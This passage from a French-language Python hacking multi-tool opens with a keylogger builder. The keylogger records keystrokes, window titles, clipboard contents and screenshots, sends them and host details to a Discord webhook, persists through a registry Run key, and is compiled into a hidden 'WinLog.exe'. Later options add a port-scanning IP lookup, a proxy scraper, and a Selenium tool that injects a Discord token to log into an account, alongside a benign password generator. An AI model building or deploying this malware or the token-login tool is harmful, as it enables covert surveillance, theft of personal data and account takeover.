                tmp = tempfile.mktemp(suffix=".txt")
                with open(tmp, "w", encoding="utf-8") as f:
                    f.write(log)
                send_file(tmp, f"Full log — {info['hostname']}")
                os.remove(tmp)
                open(LOG_FILE, "w").close()
                hide_log()
        except Exception:
            pass

        if CAPTURE_SCREENSHOTS:
            shot = capture_screen()
            if shot:
                send_file(shot, f"Screen — {info['hostname']}")
                try: os.remove(shot)
                except: pass

def install_persistence():
    try:
        import winreg
        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                           r"Software\Microsoft\Windows\CurrentVersion\Run",
                           0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(k, "WinLog", 0, winreg.REG_SZ, f'"{sys.executable}"')
        winreg.CloseKey(k)
    except Exception:
        pass

def main():
    install_persistence()

    info = system_info()
    send_embed(
        "Keylogger Online",
        f"**{info['hostname']}** — `{info['user']}`\n"
        f"{info['os']} — `{info['ip']}`\n"
        f"Mode : W={CAPTURE_WINDOWS} C={CAPTURE_CLIPBOARD} S={CAPTURE_SCREENSHOTS}\n"
        f"Intervalle : {SEND_INTERVAL}s",
        color=0xFFFFFF,
    )

    threading.Thread(target=flush, daemon=True).start()
    if CAPTURE_WINDOWS:
        threading.Thread(target=watch_windows, daemon=True).start()
    if CAPTURE_CLIPBOARD:
        threading.Thread(target=watch_clipboard, daemon=True).start()

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    try:
        main()
    except Exception:
        pass
'''

    cap_windows = "True" if mode in ("2", "3", "4") else "False"
    cap_clipboard = "True" if mode in ("3", "4") else "False"
    cap_screenshots = "True" if mode == "4" else "False"

    src = payload.replace("__WEBHOOK_URL__", webhook)
    src = src.replace("__CAP_WINDOWS__", cap_windows)
    src = src.replace("__CAP_CLIPBOARD__", cap_clipboard)
    src = src.replace("__CAP_SCREENSHOTS__", cap_screenshots)
    src = src.replace("__INTERVAL__", str(interval))

    tmp = _safe_tmp("_keylogger_tmp.py")
    with open(tmp, "w", encoding="utf-8") as f:
        f.write(src)

    try:
        import PyInstaller  # noqa
    except ImportError:
        print(f"{YELLOW}[+] Installation de PyInstaller...{RESET}")
        subprocess.run([sys.executable, "-m", "pip", "install", "--upgrade", "pyinstaller"],
                       cwd=_safe_cwd(), check=True)

    dist_dir = _safe_dist()
    work_dir = _safe_tmp("build_keylog")
    spec_dir = _safe_workdir()

    print(f"{YELLOW}[+] Compilation...{RESET}")
    args = [
        sys.executable, "-m", "PyInstaller",
        "--onefile", "--noconsole", "--clean",
        "--name", "WinLog",
        "--distpath", dist_dir,
        "--workpath", work_dir,
        "--specpath", spec_dir,
        "--hidden-import=pynput.keyboard._win32",
        "--hidden-import=pynput.mouse._win32",
        "--hidden-import=pyperclip",
        "--hidden-import=mss",
        "--hidden-import=mss.tools",
        "--hidden-import=requests",
        "--runtime-tmpdir", "%TEMP%",
        tmp,
    ]
    r = subprocess.run(args, capture_output=True, text=True, cwd=_safe_cwd())
    if r.returncode != 0:
        print(f"{RED}[-] Echec compilation.{RESET}")
        print(r.stderr[-1500:])
        pause()
        return

    exe = os.path.join(dist_dir, "WinLog.exe")
    print(f"{GREEN}[+] Termine : {exe}{RESET}")
    print(f"{GRAY}[i] Mode : {mode} (W={cap_windows} C={cap_clipboard} S={cap_screenshots}){RESET}")
    print(f"{GRAY}[i] Intervalle : {interval}s{RESET}")

    for p in [tmp, os.path.join(spec_dir, "WinLog.spec"), work_dir]:
        try:
            if os.path.isdir(p):
                shutil.rmtree(p, ignore_errors=True)
            elif os.path.isfile(p):
                os.remove(p)
        except Exception:
            pass
    pause()


def option_15():
    clear()
    banner()

    print(f"\n{CYAN}   [ PASSWORD GENERATOR ]{RESET}\n")
    try:
        length = int(input(f"{YELLOW}[?]{RESET} Length -> ").strip())
        if length < 1:
            print(f"{RED}[!] Longueur invalide.{RESET}")
            pause()
            return
        if length > 2048:
            length = 2048
    except ValueError:
        print(f"{RED}[!] Nombre invalide.{RESET}")
        pause()
        return

    print(f"\n{GRAY}01 -> Letters Only{RESET}")
    print(f"{GRAY}02 -> Letters & Numbers{RESET}")
    print(f"{GRAY}03 -> Letters, Numbers & Symbols{RESET}")
    choice = input(f"{YELLOW}[?]{RESET} Choice -> ").strip().lstrip("0")

    if choice == "1":
        chars = string.ascii_letters
    elif choice == "2":
        chars = string.ascii_letters + string.digits
    elif choice == "3":
        chars = string.ascii_letters + string.digits + string.punctuation
    else:
        print(f"{RED}[!] Choix invalide.{RESET}")
        pause()
        return

    import secrets
    pw = "".join(secrets.choice(chars) for _ in range(length))
    print(f"\n{GREEN}Password :{RESET} {pw}")
    pause()


def option_16():
    clear()
    banner()

    print(f"\n{CYAN}   [ IP LOOKUP - OSINT ]{RESET}\n")
    target = input(f"{CYAN}[?]{RESET} Host ou IP {RED}->{RESET} ").strip()
    if not target:
        print(f"{RED}[!] Aucun host.{RESET}")
        pause()
        return

    target = target.removeprefix("https://").removeprefix("http://").rstrip("/").split("/")[0]

    print(f"{YELLOW}[*] Resolution DNS...{RESET}")
    resolved = None
    target_ip = None

    if re.match(r"^(?:\d{1,3}\.){3}\d{1,3}$", target):
        target_ip = target
        resolved = target
    else:
        try:
            resolved = socket.gethostbyname(target)
            target_ip = resolved
        except socket.gaierror:
            print(f"{RED}[!] Resolution DNS impossible.{RESET}")
            pause()
            return

    print(f"{GREEN}[+] IP resolue : {target_ip}{RESET}")

    results = {}
    rlock = threading.Lock()

    def safe_get(url, headers=None, timeout=10):
        try:
            h = headers or {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124",
                "Accept": "application/json, text/html, */*",
            }
            return requests.get(url, headers=h, timeout=timeout)
        except Exception:
            return None

    def q_ipapi():
        r = safe_get(
            f"http://ip-api.com/json/{target_ip}"
            "?fields=status,country,countryCode,regionName,city,zip,"
            "lat,lon,timezone,isp,org,as,asname,reverse,proxy,hosting,mobile,query"
        )
        if r and r.status_code == 200:
            try:
                data = r.json()
                if data.get("status") == "success":
                    with rlock:
                        results["ipapi"] = data
            except Exception:
                pass

    def q_ipinfo():
        r = safe_get(f"https://ipinfo.io/{target_ip}/json")
        if r and r.status_code == 200:
            try:
                with rlock:
                    results["ipinfo"] = r.json()
            except Exception:
                pass

    def q_shodan():
        r = safe_get(f"https://internetdb.shodan.io/{target_ip}")
        if r and r.status_code == 200:
            try:
                with rlock:
                    results["shodan"] = r.json()
            except Exception:
                pass

    def q_rdap():
        r = safe_get(f"https://rdap.org/ip/{target_ip}")
        if r and r.status_code == 200:
            try:
                with rlock:
                    results["rdap"] = r.json()
            except Exception:
                pass

    def q_bgpview():
        r = safe_get(f"https://api.bgpview.io/ip/{target_ip}")
        if r and r.status_code == 200:
            try:
                data = r.json()
                if data.get("status") == "ok":
                    with rlock:
                        results["bgpview"] = data.get("data", {})
            except Exception:
                pass

    def q_abuseipdb():
        r = safe_get(f"https://www.abuseipdb.com/check/{target_ip}", timeout=12)
        if r and r.status_code == 200:
            body = r.text.lower()
            with rlock:
                results["abuseipdb_page"] = {
                    "reported": "was found in our database" in body or "reported" in body,
                }

    def q_reverse_dns():
        try:
            rev = socket.gethostbyaddr(target_ip)
            with rlock:
                results["reverse_dns"] = {
                    "hostname": rev[0],
                    "aliases": rev[1],
                    "ips": rev[2],
                }
        except Exception:
            pass

    def q_http_headers():
        for proto in ("https", "http"):
            try:
                r = requests.head(f"{proto}://{target_ip}/", timeout=6, verify=False, allow_redirects=False)
                with rlock:
                    results["http_headers"] = dict(r.headers)
                    results["http_status"] = r.status_code
                return
            except Exception:
                continue

    def q_ports():
        COMMON_PORTS = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 3306, 3389, 5432, 5900, 6379, 8080, 8443, 27017]
        open_ports = []

        def try_port(p):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1.5)
                res = s.connect_ex((target_ip, p))
                s.close()
                if res == 0:
                    return p
            except Exception:
                return None
            return None

        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as ex:
            for p in ex.map(try_port, COMMON_PORTS):
                if p:
                    open_ports.append(p)

        with rlock:
            results["open_ports"] = sorted(open_ports)

    print(f"{YELLOW}[*] Interrogation des sources OSINT...{RESET}\n")

    threads = [
        threading.Thread(target=q_ipapi, daemon=True),
        threading.Thread(target=q_ipinfo, daemon=True),
        threading.Thread(target=q_shodan, daemon=True),
        threading.Thread(target=q_rdap, daemon=True),
        threading.Thread(target=q_bgpview, daemon=True),
        threading.Thread(target=q_abuseipdb, daemon=True),
        threading.Thread(target=q_reverse_dns, daemon=True),
        threading.Thread(target=q_http_headers, daemon=True),
        threading.Thread(target=q_ports, daemon=True),
    ]
    for t in threads:
        t.start()
    for t in threads:
        t.join()

    geo = results.get("ipapi") or {}
    if not geo:
        ii = results.get("ipinfo", {})
        geo = {
            "country": ii.get("country"),
            "regionName": ii.get("region"),
            "city": ii.get("city"),
            "zip": ii.get("postal"),
            "lat": (ii.get("loc", "0,0").split(",") + ["0"])[0],
            "lon": (ii.get("loc", "0,0").split(",") + ["0", "0"])[1],
            "timezone": ii.get("timezone"),
            "isp": ii.get("org"),
            "org": ii.get("org"),
        }

    print(f"\n{RED}{BOLD}═══════════════════════════════════════════════════{RESET}")
    print(f"{RED}{BOLD}  IP : {target_ip}{RESET}")
    if resolved != target_ip:
        print(f"{RED}{BOLD}  Host : {target}{RESET}")
    print(f"{RED}{BOLD}═══════════════════════════════════════════════════{RESET}\n")

    print(f"{CYAN}{BOLD}── GEOLOCALISATION ──{RESET}")
    if geo:
        for k, label in [
            ("country", "Pays"), ("countryCode", "Code pays"),
            ("regionName", "Region"), ("city", "Ville"),
            ("zip", "ZIP"), ("lat", "Latitude"), ("lon", "Longitude"),
            ("timezone", "Timezone"),
        ]:
            v = geo.get(k)
            if v:
                print(f"{GREEN}[+] {label:<14}{RED} {v}{RESET}")
    else:
        print(f"{GRAY}[-] Aucune donnee geo{RESET}")

    print(f"\n{CYAN}{BOLD}── RESEAU / OPERATEUR ──{RESET}")
    for k, label in [
        ("isp", "ISP"), ("org", "Organization"), ("as", "AS"),
        ("asname", "AS Name"), ("reverse", "Reverse DNS"),
    ]:
        v = geo.get(k)
        if v:
            print(f"{GREEN}[+] {label:<14}{RED} {v}{RESET}")

    types = []
    if geo.get("proxy"):
        types.append("Proxy")
    if geo.get("hosting"):
        types.append("Hosting/VPN/Datacenter")
    if geo.get("mobile"):
        types.append("Mobile")
    if not types:
        types.append("Residential")
    print(f"{GREEN}[+] Type          {RED} {', '.join(types)}{RESET}")

    if "reverse_dns" in results:
        rv = results["reverse_dns"]
        print(f"\n{CYAN}{BOLD}── REVERSE DNS ──{RESET}")
        print(f"{GREEN}[+] Hostname      {RED} {rv['hostname']}{RESET}")
        if rv.get("aliases"):
            print(f"{GREEN}[+] Aliases       {RED} {', '.join(rv['aliases'])}{RESET}")

    if "http_headers" in results:
        print(f"\n{CYAN}{BOLD}── HTTP HEADERS ──{RESET}")
        print(f"{GREEN}[+] Status        {RED} {results.get('http_status')}{RESET}")
        for k in ("Server", "X-Powered-By", "X-AspNet-Version", "Via", "CF-Ray", "X-Cache"):
            if k in results["http_headers"]:
                print(f"{GREEN}[+] {k:<14}{RED} {results['http_headers'][k]}{RESET}")

    if "open_ports" in results:
        ports = results["open_ports"]
        print(f"\n{CYAN}{BOLD}── PORTS OUVERTS ──{RESET}")
        if ports:
            PORT_NAMES = {
                21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
                80: "HTTP", 110: "POP3", 143: "IMAP", 443: "HTTPS",
                445: "SMB", 3306: "MySQL", 3389: "RDP", 5432: "PostgreSQL",
                5900: "VNC", 6379: "Redis", 8080: "HTTP-alt",
                8443: "HTTPS-alt", 27017: "MongoDB",
            }
            for p in ports:
                label = PORT_NAMES.get(p, "unknown")
                color = RED if p in (22, 23, 445, 3389, 5900, 3306, 6379, 27017) else GREEN
                print(f"{color}[+] {p:<6} {label}{RESET}")
        else:
            print(f"{GRAY}[-] Aucun port commun ouvert{RESET}")

    if "shodan" in results:
        sd = results["shodan"]
        print(f"\n{CYAN}{BOLD}── SHODAN INTERNETDB ──{RESET}")
        if sd.get("hostnames"):
            print(f"{GREEN}[+] Hostnames   {RED} {', '.join(sd['hostnames'][:5])}{RESET}")
        if sd.get("ports"):
            print(f"{GREEN}[+] Ports        {RED} {sd['ports']}{RESET}")
        if sd.get("cpes"):
            for cpe in sd["cpes"][:10]:
                print(f"{GREEN}[+] CPE          {RED} {cpe}{RESET}")
        if sd.get("vulns"):
            print(f"{RED}[!] VULNERABILITES DETECTEES :{RESET}")
            for v in sd["vulns"]:
                print(f"{RED}    - {v}  → https://nvd.nist.gov/vuln/detail/{v}{RESET}")

    if "rdap" in results:
        rd = results["rdap"]
        print(f"\n{CYAN}{BOLD}── RDAP / WHOIS ──{RESET}")
        for e in (rd.get("entities") or [])[:3]:
            roles = ", ".join(e.get("roles", []))
            if roles:
                vcard = e.get("vcardArray", [None, []])[1]
                name = ""
                for item in vcard:
                    if item[0] == "fn":
                        name = item[3]
                        break
                if name:
                    print(f"{GREEN}[+] {roles:<20}{RED} {name}{RESET}")
        if rd.get("name"):
            print(f"{GREEN}[+] Network name  {RED} {rd['name']}{RESET}")
        if rd.get("handle"):
            print(f"{GREEN}[+] Handle        {RED} {rd['handle']}{RESET}")
        if rd.get("startAddress"):
            print(f"{GREEN}[+] Range         {RED} {rd.get('startAddress')} - {rd.get('endAddress', '?')}{RESET}")
        if rd.get("country"):
            print(f"{GREEN}[+] Country (reg) {RED} {rd['country']}{RESET}")

    if "bgpview" in results:
        bg = results["bgpview"]
        prefix = (bg.get("prefixes") or [{}])[0]
        if prefix:
            print(f"\n{CYAN}{BOLD}── BGP / ROUTAGE ──{RESET}")
            print(f"{GREEN}[+] Prefix      {RED} {prefix.get('prefix')}{RESET}")
            print(f"{GREEN}[+] Description {RED} {prefix.get('description')}{RESET}")
            asn = prefix.get("asn", {})
            if asn:
                print(f"{GREEN}[+] ASN         {RED} AS{asn.get('asn')} — {asn.get('name', '')}{RESET}")

    if "abuseipdb_page" in results:
        ab = results["abuseipdb_page"]
        if ab.get("reported"):
            print(f"\n{RED}{BOLD}── ABUSE REPORTS ──{RESET}")
            print(f"{RED}[!] Cette IP est signalee dans des rapports d'abus{RESET}")
            print(f"{GRAY}    https://www.abuseipdb.com/check/{target_ip}{RESET}")

    print(f"\n{CYAN}{BOLD}── RECHERCHES COMPLEMENTAIRES ──{RESET}")
    dorks = [
        f'"{target_ip}"',
        f'site:shodan.io {target_ip}',
        f'site:censys.io {target_ip}',
        f'"{target_ip}" abuse',
    ]
    for d in dorks:
        print(f"{GRAY}  {d}{RESET}")
        print(f"{GRAY}  https://www.google.com/search?q={urllib.parse.quote(d)}{RESET}")

    try:
        out_dir = Path(_safe_workdir()) / "Output" / "IPLookup"
        out_dir.mkdir(parents=True, exist_ok=True)
        safe_ip = target_ip.replace(".", "_")
        out_file = out_dir / f"IP_{safe_ip}.json"
        with open(out_file, "w", encoding="utf-8") as f:
            json.dump({
                "target": target,
                "ip": target_ip,
                "results": results,
                "timestamp": datetime.now().isoformat(),
            }, f, indent=2, ensure_ascii=False)
        print(f"\n{GREEN}[+] Rapport JSON : {out_file}{RESET}")
    except Exception:
        pass

    pause()


def option_17():
    clear()
    banner()
    if not _need_requests():
        pause()
        return

    print(f"\n{CYAN}   [ PROXY SCRAPER ]{RESET}\n")
    print(f"{BLUE}01{RESET} Http")
    print(f"{BLUE}02{RESET} Https")
    print(f"{BLUE}03{RESET} Socks4")
    print(f"{BLUE}04{RESET} Socks5")
    print(f"{BLUE}05{RESET} All\n")

    choice = input(f"{YELLOW}[?]{RESET} Choice -> ").strip().lstrip("0")
    if choice not in ["1", "2", "3", "4", "5"]:
        print(f"{RED}[!] Choix invalide.{RESET}")
        pause()
        return

    check = input(f"{YELLOW}[?]{RESET} Check proxies? (y/n) -> ").strip().lower()
    do_check = check in ["y", "yes"]

    max_latency = 5000
    check_limit = None
    test_target = "https://api.ipify.org?format=json"

    if do_check:
        try:
            lat = input(f"{YELLOW}[?]{RESET} Max latency ms (def 5000) -> ").strip()
            if lat:
                max_latency = int(lat)
        except ValueError:
            max_latency = 5000
        try:
            lim = input(f"{YELLOW}[?]{RESET} Nombre a checker (all = tous) -> ").strip().lower()
            if lim and lim != "all":
                check_limit = int(lim)
        except ValueError:
            check_limit = None

    sources = {
        "http": [
            "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
            "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
            "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
            "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
            "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
            "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt",
            "https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
            "https://raw.githubusercontent.com/prxchk/proxy-list/main/http.txt",
            "https://raw.githubusercontent.com/zloi-user/hideip.me/main/http.txt",
            "https://raw.githubusercontent.com/vakhov/fresh-proxy-list/master/http.txt",
            "https://raw.githubusercontent.com/zevtyardt/proxy-list/main/http.txt",
            "https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/http.txt",
            "https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies/http.txt",
        ],
        "https": [
            "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
            "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/https.txt",
            "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
            "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-https.txt",
            "https://raw.githubusercontent.com/mmpx12/proxy-list/master/https.txt",
            "https://raw.githubusercontent.com/zloi-user/hideip.me/main/https.txt",
            "https://raw.githubusercontent.com/vakhov/fresh-proxy-list/master/https.txt",
            "https://raw.githubusercontent.com/prxchk/proxy-list/main/https.txt",
            "https://raw.githubusercontent.com/aslisk/proxyhttps/main/https.txt",
        ],
        "socks4": [
            "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=10000&country=all&ssl=all&anonymity=all",
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
            "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks4.txt",
            "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks4.txt",
            "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS4_RAW.txt",
            "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks4.txt",
            "https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks4.txt",
            "https://raw.githubusercontent.com/prxchk/proxy-list/main/socks4.txt",
            "https://raw.githubusercontent.com/zloi-user/hideip.me/main/socks4.txt",
            "https://raw.githubusercontent.com/vakhov/fresh-proxy-list/master/socks4.txt",
            "https://raw.githubusercontent.com/zevtyardt/proxy-list/main/socks4.txt",
            "https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/socks4.txt",
            "https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies/socks4.txt",
        ],
        "socks5": [
            "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all",
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
            "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt",
            "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt",
            "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5_RAW.txt",
            "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
            "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks5.txt",
            "https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks5.txt",
            "https://raw.githubusercontent.com/prxchk/proxy-list/main/socks5.txt",
            "https://raw.githubusercontent.com/zloi-user/hideip.me/main/socks5.txt",
            "https://raw.githubusercontent.com/vakhov/fresh-proxy-list/master/socks5.txt",
            "https://raw.githubusercontent.com/zevtyardt/proxy-list/main/socks5.txt",
            "https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/socks5.txt",
            "https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies/socks5.txt",
        ],
    }

    protocol_map = {
        "1": ["http"], "2": ["https"], "3": ["socks4"], "4": ["socks5"],
        "5": ["http", "https", "socks4", "socks5"],
    }
    selected = protocol_map[choice]

    total_sources = sum(len(sources[p]) for p in selected)
    print(f"\n{CYAN}[*] Scraping {total_sources} sources...{RESET}")

    proxies = set()
    seen_hosts = set()
    lock = threading.Lock()
    sem = threading.Semaphore(50)
    scraped_count = [0]

    def scrape(url, proto):
        with sem:
            try:
                r = requests.get(url, timeout=12)
                if r.status_code != 200:
                    return
                for line in r.text.splitlines():
                    line = line.strip()
                    if "://" in line:
                        line = line.split("://")[-1]
                    parts = line.split(":")
                    if len(parts) < 2:
                        continue
                    host_part = parts[0].strip()
                    port_part = parts[1].strip()
                    if not re.match(r"^(?:\d{1,3}\.){3}\d{1,3}$", host_part):
                        continue
                    try:
                        port = int(port_part)
                        if not (1 <= port <= 65535):
                            continue
                    except ValueError:
                        continue
                    host = f"{host_part}:{port}"
                    with lock:
                        if host not in seen_hosts:
                            seen_hosts.add(host)
                            proxies.add(f"{proto}://{host}")
                with lock:
                    scraped_count[0] += 1
                    sys.stdout.write(
                        f"\r{CYAN}[*] {scraped_count[0]}/{total_sources} sources  |  "
                        f"{GREEN}{len(proxies)} proxies{RESET}    "
                    )
                    sys.stdout.flush()
            except Exception:
                pass

    threads = []
    for proto in selected:
        for url in sources[proto]:
            t = threading.Thread(target=scrape, args=(url, proto), daemon=True)
            threads.append(t)
            t.start()
    for t in threads:
        t.join()

    print()

    if not proxies:
        print(f"{RED}[!] Aucun proxy trouve.{RESET}")
        pause()
        return

    proxies = list(proxies)
    print(f"{GREEN}[+] {len(proxies)} proxies uniques recuperes{RESET}")

    valid = []
    if do_check:
        to_check = proxies[:check_limit] if check_limit else proxies
        print(f"{CYAN}[*] Check de {len(to_check)} proxies (max {max_latency}ms)...{RESET}\n")

        lock_v = threading.Lock()
        sem_v = threading.Semaphore(100)
        checked = [0]

        def check_proxy(proxy):
            with sem_v:
                try:
                    proto = proxy.split("://")[0]
                    start = time.time()
                    r = requests.get(
                        test_target,
                        proxies={proto: proxy},
                        timeout=max_latency / 1000,
                        headers={"User-Agent": "Mozilla/5.0 Chrome/124"},
                    )
                    lat = round((time.time() - start) * 1000)
                    if r.status_code != 200:
                        return

                    out_ip = "?"
                    try:
                        if "ipify" in test_target:
                            out_ip = r.json().get("ip", "?")
                        else:
                            out_ip = "ok"
                    except Exception:
                        pass

                    with lock_v:
                        valid.append({
                            "proxy": proxy,
                            "proto": proto,
                            "latency": lat,
                            "out_ip": out_ip,
                        })
                        checked[0] += 1
                        if checked[0] % 5 == 0:
                            sys.stdout.write(
                                f"\r{GREEN}[+] {checked[0]}/{len(to_check)} testes  |  "
                                f"{len(valid)} valides{RESET}    "
                            )
                            sys.stdout.flush()
                except Exception:
                    pass

        ts = [threading.Thread(target=check_proxy, args=(p,), daemon=True) for p in to_check]
        for t in ts:
            t.start()
        for t in ts:
            t.join()

        print(f"\n\n{GREEN}[+] {len(valid)} proxies valides sur {len(to_check)}{RESET}\n")

        valid.sort(key=lambda x: x["latency"])

        print(f"{CYAN}   TOP 20 PROXIES{RESET}")
        for i, v in enumerate(valid[:20], 1):
            print(
                f"{GREEN}[{i:>2}]{RESET} {v['proxy']:<45} | "
                f"{CYAN}{v['latency']:>5}ms{RESET} | "
                f"{GRAY}{v['out_ip']}{RESET}"
            )

        to_save = [v["proxy"] for v in valid]
    else:
        to_save = proxies

    out_dir = Path(_safe_workdir()) / "Output" / "ProxyScraper"
    out_dir.mkdir(parents=True, exist_ok=True)

    out_txt = out_dir / "proxies.txt"
    with open(out_txt, "w", encoding="utf-8") as f:
        f.write("\n".join(to_save))

    if do_check:
        out_json = out_dir / "proxies.json"
        with open(out_json, "w", encoding="utf-8") as f:
            json.dump(valid, f, indent=2, ensure_ascii=False)

    print(f"\n{GREEN}[+] Export :{RESET}")
    print(f"{GRAY}    {out_txt}{RESET}")

    if do_check and valid:
        print(f"\n{CYAN}   STATS{RESET}")
        print(f"{GREEN}[+] Total valides : {len(valid)}{RESET}")
        print(f"{GREEN}[+] Latence moyenne : {sum(v['latency'] for v in valid) // len(valid)}ms{RESET}")
        print(f"{GREEN}[+] Latence min : {valid[0]['latency']}ms{RESET}")

    try:
        if platform.system() == "Windows":
            os.startfile(str(out_dir))
        elif platform.system() == "Darwin":
            subprocess.Popen(["open", str(out_dir)])
        else:
            subprocess.Popen(["xdg-open", str(out_dir)])
    except Exception:
        pass
    pause()


def option_18():
    clear()
    banner()

    try:
        from selenium import webdriver
        from selenium.webdriver.chrome.options import Options as ChromeOptions
        from selenium.webdriver.edge.options import Options as EdgeOptions
        from selenium.webdriver.firefox.options import Options as FirefoxOptions
    except ImportError:
        print(f"{RED}[!] Selenium manquant. pip install selenium{RESET}")
        pause()
        return

    print(f"\n{CYAN}   [ DISCORD TOKEN LOGIN ]{RESET}\n")

    # 1. Saisie du token
    token = input(f"{YELLOW}[?]{RESET} Colle ton token Discord {RED}->{RESET} ").strip()
    if not token:
        print(f"{RED}[!] Token vide.{RESET}")
        pause()
        return

    # 2. Verification rapide via l'API
    print(f"\n{YELLOW}[*] Verification du token via API Discord...{RESET}")
    try:
        r = requests.get(
            "https://discord.com/api/v9/users/@me",
            headers={"Authorization": token, "User-Agent": "Mozilla/5.0"},
            timeout=8,
        )
        if r.status_code == 200:
            info = r.json()
            print(f"{GREEN}[+] Token valide — @{info.get('username', '?')} ({info.get('id', '?')}){RESET}")
        elif r.status_code == 401:
            print(f"{RED}[!] Token invalide (401).{RESET}")
            pause()
            return
        else:
            print(f"{YELLOW}[!] HTTP {r.status_code}{RESET}")
    except Exception as e:
        print(f"{RED}[!] Erreur API : {e}{RESET}")
        # On continue quand même, l'injection est indépendante de l'API

    # 3. Choix du navigateur
    print(f"\n{GRAY}Browser :{RESET}")
    print(f"{GRAY}  1. Google Chrome{RESET}")
    print(f"{GRAY}  2. Microsoft Edge{RESET}")
    print(f"{GRAY}  3. Mozilla Firefox{RESET}")

    bc = input(f"{YELLOW}[?]{RESET} Choix (1-3) {RED}->{RESET} ").strip().lstrip("0") or "1"
    if bc not in ["1", "2", "3"]:
        print(f"{RED}[!] Choix invalide.{RESET}")
        pause()
        return

    browser_names = {
        "1": "Google Chrome",
        "2": "Microsoft Edge",
        "3": "Mozilla Firefox",
    }
    browser_name = browser_names[bc]

    print(f"\n{YELLOW}[*] Starting {browser_name}...{RESET}")

    # 4. Lancement du navigateur
    driver = None
    try:
        if bc == "1":
            options = ChromeOptions()
            options.add_argument("--disable-blink-features=AutomationControlled")
            options.add_experimental_option("excludeSwitches", ["enable-automation"])
            driver = webdriver.Chrome(options=options)
        elif bc == "2":
            options = EdgeOptions()
            options.add_argument("--disable-blink-features=AutomationControlled")
            driver = webdriver.Edge(options=options)
        elif bc == "3":
            options = FirefoxOptions()
            driver = webdriver.Firefox(options=options)
    except Exception:
        print(f"{RED}[!] {browser_name} non installe ou driver introuvable !{RESET}")
        pause()
        return

    # 5. Injection du token (le js exact de ton script)
    js_code = f"""
    function login(token) {{
        setInterval(() => {{
            document.body.appendChild(document.createElement('iframe')).contentWindow.localStorage.token = `"${{token}}"`;
        }}, 50);
        setTimeout(() => {{
            location.reload();
        }}, 2500);
    }}
    login("{token}");
    """

    try:
        driver.get("https://discord.com/login")
        time.sleep(2)

        print(f"{YELLOW}[*] Injection du token...{RESET}")
        driver.execute_script(js_code)
        time.sleep(5)

        print(f"{GREEN}[+] Token injected !{RESET}")
        print(f"{GRAY}[i] Si tu fermes le tool, {browser_name} se fermera.{RESET}")

    except Exception as e:
        print(f"{RED}[!] Impossible d'injecter le token !{RESET}")
        print(f"{GRAY}    {e}{RESET}")
        if driver:
            driver.quit()
        pause()
        return

    # 6. On garde le driver ouvert jusqu'à ce que l'utilisateur appuie sur Entrée
    pause()

    try:
        driver.quit()
    except Exception:
        pass

def option_19():
    clear()
    banner()

    def _h(name):
        def f(s):
            if isinstance(s, str):
                s = s.encode()
            return hashlib.new(name, s).hexdigest()
        return f

    SIGS = [
        (r"^\$2[aby]?\$\d{2}\$[./A-Za-z0-9]{53}$", "bcrypt", None),
        (r"^\$6\$", "sha512crypt", None),
        (r"^\$5\$", "sha256crypt", None),
        (r"^\$1\$", "md5crypt", None),
        (r"^[a-f0-9]{32}$", "md5", _h("md5")),
        (r"^[a-f0-9]{40}$", "sha1", _h("sha1")),
        (r"^[a-f0-9]{56}$", "sha224", _h("sha224")),
        (r"^[a-f0-9]{64}$", "sha256", _h("sha256")),
        (r"^[a-f0-9]{96}$", "sha384", _h("sha384")),
        (r"^[a-f0-9]{128}$", "sha512", _h("sha512")),
    ]

    ALGO_MAP = {
        "md5": "md5", "sha1": "sha1", "sha224": "sha224",
        "sha256": "sha256", "sha384": "sha384", "sha512": "sha512",
    }

    def identifier(h):
        h = h.strip()
        return [name for regex, name, _ in SIGS if re.match(regex, h, re.IGNORECASE)]

    def algo_fn(name):
        n = ALGO_MAP.get(name)
        return _h(n) if n else None

